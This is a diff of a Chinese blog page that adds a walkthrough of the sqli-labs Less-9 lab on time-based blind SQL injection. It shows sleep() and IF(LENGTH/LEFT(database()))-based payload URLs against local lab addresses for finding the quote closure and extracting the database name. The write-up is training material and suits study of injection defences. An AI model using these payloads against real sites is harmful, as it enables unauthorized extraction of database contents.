@@ -3,7 +3,7 @@
 <html lang="zh-CN">
 <head>
     <meta charset="utf-8" />
-    <title>Categories: 心路历程 | blackceng的小窝</title>
+    <title>布尔时间盲注（less9） | blackceng的小窝</title>
     <meta name="author" content="blackceng" />
     <meta name="description" content="我们要做的，就是追上那该死的火车，CJ！" />
     <meta name="keywords" content="" />
@@ -37,6 +37,10 @@
 
 
 <script src="/js/lib/preview.js"></script>
+
+
+
+
 
 
 
@@ -150,14 +154,20 @@
 </transition>
 
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
-            <div id="archives">
-    
-    <div class="categories-tags">
+            <div class="article">
+    <div>
+        <h1>布尔时间盲注（less9）</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/12/30
+        </span>
         
-        
-        
-        <span>
-            <a href="/categories/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5%E7%94%9F%E6%B4%BB/" style="background: #ffa2c4">
+        <span class="category">
+            <a href="/categories/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5%E7%94%9F%E6%B4%BB/">
                 <span class="icon">
                     <i class="fa-solid fa-bookmark fa-fw"></i>
                 </span>
@@ -166,58 +176,64 @@
         </span>
         
         
-        
-        <span>
-            <a href="/categories/%E5%BF%83%E8%B7%AF%E5%8E%86%E7%A8%8B/" style="background: linear-gradient(120deg, #9abbf7 0%, #ffbbf4 100%)">
-                <span class="icon">
-                    <i class="fa-solid fa-bookmark fa-fw"></i>
-                </span>
-                心路历程
-            </a>
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/sql-lab/" style="color: #ff7d73">
+                    sql_lab
+                </a>
+            </span>
+            
         </span>
-        
-        
-        
         
     </div>
     
-    <div class="timeline">
-        <div class="timeline-tail"></div>
-        <div class="timeline-content">
-            <div class="item-time">2025/11/7</div>
-            <a href="/2025/11/07/My-New-Post/">
-                <h3>我的第一次博客搭建过程</h3>
-            </a>
-            <div class="info">
-                
-                <span class="category">
-                    <a href="/categories/%E5%BF%83%E8%B7%AF%E5%8E%86%E7%A8%8B/">
-                        <span class="icon">
-                            <i class="fa-solid fa-bookmark fa-fw"></i>
-                        </span>
-                        心路历程
-                    </a>
-                </span>
-                
-                
-                <span class="tags">
-                    <span class="icon">
-                        <i class="fa-solid fa-tags fa-fw"></i>
-                    </span>
-                    
-                    
-                    <span class="tag">
-                        
-                        <a href="/tags/hexo/" style="color: #ffa2c4">
-                            hexo
-                        </a>
-                    </span>
-                    
-                </span>
-                
-            </div>
-        </div>
+    <div class="content" v-pre>
+        <h1 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h1><p>less9在less8的基础上使得任意输入都只会返回you are in….，这使得我们无法通过回显不回显来判断语句是否正确，这时我们就可以通过时间上的差异判断语句。即通过sleep语句让页面延迟回显来判断语句的正确与否。</p>
+<p>例如</p>
+<pre><code>http://192.168.33.1/sqli/Less-9/?id=1&#39; and sleep(5)-- #
+</code></pre>
+<p>输入该语句后页面会延迟回显5秒</p>
+<p>在此基础上加入if语句</p>
+<pre><code>if(条件，真:执行,假:执行)
+</code></pre>
+<p>例如</p>
+<pre><code>http://192.168.33.1/sqli/Less-9/?id=1&#39; and if(length(database())=8,sleep(5),1)-- #
+</code></pre>
+<p>通过观察页面是否延迟回显判断数据库长度。</p>
+<p>因此本题和less8在手工注入上的区别不大，就是在原先条件判断的基础上加入if语句使得真假时的页面回显速度不一致来判断。</p>
+<h1 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h1><h2 id="判断类型和闭合符号"><a href="#判断类型和闭合符号" class="headerlink" title="判断类型和闭合符号"></a>判断类型和闭合符号</h2><pre><code>http://127.0.0.1/sqli-labs-master/Less-9/?id=1 and 1=1 and sleep(5)
+</code></pre>
+<pre><code>http://127.0.0.1/sqli-labs-master/Less-9/?id=1 and 1=2 and sleep(5)
+</code></pre>
+<p>前后页面反馈没有区别，判断为字符型。</p>
+<pre><code>http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#39;and sleep(5)
+</code></pre>
+<p>页面正常回显</p>
+<pre><code>http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#39;and sleep(5)--+
+</code></pre>
+<p>页面延迟回显，说明’是本题的闭合符号。</p>
+<h2 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h2><pre><code>?id=1&#39; AND IF(LENGTH(database())=10,sleep(1),1)--+
+</code></pre>
+<p>通过修改length的值观察页面可得到database长度为8</p>
+<p>然后开始爆破数据库名称</p>
+<pre><code>?id=1&#39; AND IF(LEFT((SELECT database()), 1)=&#39;a&#39;,sleep(1),1)--+
+</code></pre>
+<p>再用bp爆破得到数据库名为security。</p>
+<h1 id="总而言之"><a href="#总而言之" class="headerlink" title="总而言之"></a>总而言之</h1><p>该关爆破表名，字段名就是在上一关基础上在最外围添加一个if语句，故不再赘述（其实是懒得再写一遍）。</p>
+
     </div>
+    
+    
+    
+    
+    
+    
     
 </div>
 
@@ -249,6 +265,12 @@
         
     </div>
     <script src="/js/main.js"></script>
+    
+    
+
+
+
+
     
 <canvas
     id="fireworks"
